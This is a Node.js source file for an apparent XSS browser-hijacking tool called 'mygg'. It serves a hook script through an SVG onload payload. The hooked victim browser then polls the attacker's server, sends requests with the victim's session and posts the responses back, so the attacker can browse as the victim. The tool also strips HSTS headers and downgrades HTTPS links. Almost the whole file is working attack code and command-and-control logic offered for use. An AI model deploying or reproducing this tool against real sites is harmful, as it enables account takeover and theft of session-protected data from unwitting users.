/* Config */
const config = {
    // Change web_domain to your domain. 
    // If you don't have a domain, then change web_domain to the ipaddr of the server hosting mygg.js.
    web_domain: 'example.com',           
    web_interface: '0.0.0.0',
    web_port: 80,
    web_protocol: 'http',
    polling_time: 2000,
    key: './server-key.pem',
    cert: './server-cert.pem',
    // Provides additional debug output
    debug: 0,
    // If mygg is running on a remote server, then either set proxy_interface to 127.0.0.1 and use ssh+portforwarding
    // or bind it to 0.0.0.0 and put your remote addr in proxy_allowed_ips.
    proxy_interface: '127.0.0.1',
    proxy_port: 8081,
    proxy_allowed_ips: ['127.0.0.1'],
}

const web = require(config.web_protocol);
const proxy = require('http');
const fs = require('fs');
const qs = require('querystring');
const Busboy = require('busboy');

/* 
task_pending structure:
[{"id":2,"method":"POST","url":"/secret.html","head":{"Content-Type":"application/json"},"body":'{"test":"asdf"}'}]
*/

var tasks_pending = [];
var task_callbacks = {};

/* The HTTP proxy server that communicates with mygg */

var task_counter = 0;

proxy.createServer(function (req, res) {
    /* Checks if the client is allowed */
    var client_ipaddr = req.connection.remoteAddress;
    if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
        console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
        res.writeHead(403);
        res.end();
        return;
    }

    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
    console.log("[+] Requesting: " + req.method + " " + req.url)
    
    var urlObj = new URL(req.url)
    var url = urlObj.pathname;
    if (urlObj.searchParams != '') {
        url = url + '?' + urlObj.searchParams;
    }
    
    /* Check if request from proxy/attacker contains a body */
    if (req.headers['content-length'] > 0) {
        var data = [];
        req.on('data', function (chunk) {
            data.push(chunk);
        });
        req.on('end', function () {
            // Sends a task to the hooked browser
            var buffer = Buffer.concat(data);
            var body = buffer.toString('utf8');
            var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body}
            tasks_pending.push(new_task);
            
            // Handles the response from the task given to the "victim"
            task_callbacks[new_task.id] = function (result) {
                var headers = result.headers;
                var headers = str2json(headers);
                var headers = stripHeaders(headers);
                
                var content_type = headers['content-type'];
                
                /* If the received content type is binary, we need to present it as such.
                   If is it text, we need to process it before being displayed in the attacking browser. */
                if (content_type.match(/image|octet-stream/)) {
                    var body = result.body;
                } else {
                    var body = result.body.toString('utf8');
                    var body = stripHooks(body);
                    var body = https2http(body);
                }

                var body_length = body.length;
                var headers = updateContentLength(headers, body_length);

	            console.log("[+] Received status: " + result.status);
	            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
	            if (config.debug) { console.log("[+] Received body:\n" + body); }
	            console.log("[+] -------------------------------- [+]");

                res.writeHead(result.status, headers);
                res.end(body);
            };
        });
	} else {
        /* Sends a task to the hooked browser. */
        var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": null}
        tasks_pending.push(new_task);
    
        /* Handles the response from the task given to the hooked browser. */
        task_callbacks[new_task.id] = function (result) {
            var headers = result.headers;
            var headers = str2json(headers);
            var headers = stripHeaders(headers);
            
            var content_type = headers['content-type'];
            
            /* If the received content type is binary, we need to present it as such.
               If is it text, we need to process it before being displayed in the attacking browser. */
            if (content_type.match(/image|octet-stream/)) {
                var body = result.body;
            } else {
                var body = result.body.toString('utf8');
                var body = stripHooks(body);
                var body = https2http(body);
            }

            var body_length = body.length;
            var headers = updateContentLength(headers, body_length);

	        console.log("[+] Received status: " + result.status);
	        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
	        if (config.debug) { console.log("[+] Received body:\n" + body); }
	        console.log("[+] -------------------------------- [+]");

            res.writeHead(result.status, headers);
            res.end(body);
        };
    }

}).listen(config.proxy_port, config.proxy_interface, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
});


/* 
The web server communicating with the hooked browser.
Used for serving hook.js, polling and receving requests.
*/

const https_options = {
    key: fs.readFileSync(config.key),
    cert: fs.readFileSync(config.cert)
};

web.createServer(https_options, function (req, res) {
    var ipaddr = req.connection.remoteAddress;
    var useragent = req.headers['user-agent'];
    var referer = req.headers['referer'];
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        res.writeHead(200, {"Content-Type": "application/javascript"});
        res.end(hook_file);
        console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.setHeader('Content-Type', 'application/json');

        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            if (config.debug) { 
                console.log("[+] Tasks pending"); 
                console.log(data); 
                console.log("[+] -------------------------------- [+]");
            }
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the performed requests from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'POST') {

        var busboy = new Busboy({ headers: req.headers });
        var response = {};

        busboy.on('file', function(fieldname, file, filename, encoding, mimetype) {
            response[fieldname] = [];
            //console.log('File [' + fieldname + ']: filename: ' + filename + ', encoding: ' + encoding + ', mimetype: ' + mimetype);
            file.on('data', function(data) {
                //console.log('File [' + fieldname + '] got ' + data.length + ' bytes');
                response[fieldname].push(data);
            });
            file.on('end', function() {
                //console.log('File [' + fieldname + '] Finished');
                response[fieldname] = Buffer.concat(response[fieldname]);
            });
        });

        busboy.on('field', function(fieldname, val, fieldnameTruncated, valTruncated, encoding, mimetype) {
            //console.log('Field [' + fieldname + ']: value: ' + inspect(val));
            response[fieldname] = val;
        });
        busboy.on('finish', function() {
            // Runs the callback for the associated request ID
            var handler = task_callbacks[response['id']];
            handler(response);

            res.writeHead(200, { Connection: 'close' });
            res.end();
        });

        req.pipe(busboy);

    } else {
        res.writeHead(404);
        res.end();
    }
}).listen(config.web_port, config.web_interface, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Web server is listening on address ${info.address} port ${info.port}`)
});


/* Removes HSTS header */
function stripHeaders(headers) {
    delete headers['strict-transport-security'];
    delete headers['content-encoding'];
    delete headers['content-length'];
    return headers;
}

/* Strips complete URLs with hook.js to "javascript", which will be ignored */
function stripHooks(body) {
    return body.replace(/https?:\/\/.*?\/hook\.js/g, 'javascript:#');
}

/* Convert links in the body from https to http */
function https2http(body) {
    return body.toString().replace(/https\:\/\//g, "http://");
}

/* Sets the content-length header */
function updateContentLength(headers, new_length) {
    headers['Content-Length'] = new_length;
    return headers;
}

function str2json(headers) {
    var arr = headers.trim().split(/[\r\n]+/);
    var header_map = {};
    arr.forEach(function (line) {
        var parts = line.split(': ');
        var header = parts.shift().toLowerCase();
        var value = parts.join('');
        header_map[header] = value;
    });
    return header_map;
}

/* The payload that downloads mygg */
var hook = `<svg/onload="var x=document.createElement('script');\
x.src='//${config.web_domain}:${config.web_port}/hook.js';document.head.appendChild(x);">`
console.log("[+] Payload:\r\n" + hook + "\r\n");

var hook_file = `
function makeRequest(id, method, url, head, body) {
    // Forcing the "victim" browser to perform the request
    var target_http = new XMLHttpRequest();
    target_http.responseType = 'blob';
    target_http.onreadystatechange = function() {

        // Sending the response back to mygg
        if (target_http.readyState == 4) {
            var formData = new FormData();
            formData.append('id', id);
            formData.append('method', method);
            formData.append('url', url);

            // Checking if the browser got a redirect
            if (url == getPath(target_http.responseURL)) {
                formData.append('status', target_http.status);
                formData.append('headers', target_http.getAllResponseHeaders());
                var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
                formData.append('body', blob);
            } else {
                // Need to redirect the attacking browser too
                formData.append('status', '301');
                formData.append('head', "Location: " + target_http.responseURL);
            }

            var mygg_http = new XMLHttpRequest();
            mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
            mygg_http.send(formData);
        }

    };
    
    target_http.open(method, url, true);
    //for (var key in head) { target_http.setRequestHeader(key, head[key]) }
    if (body) {
        target_http.send(body);
    } else {
        target_http.send();
    }
}
function getPath(url) {
    return '/' + url.split('/').splice(3).join('/');
}
function poll() {
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            console.log("Got new task:")
            console.log(mygg_http.responseText)
            var tasks = JSON.parse(mygg_http.responseText);
            for (var i in tasks){
                console.log("TASK");console.log(tasks[i]);
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
            }
        }
    };
    mygg_http.open("GET", "//${config.web_domain}:${config.web_port}/polling", true);
    mygg_http.send();
    setTimeout(poll, ${config.polling_time});
}
poll();
`;

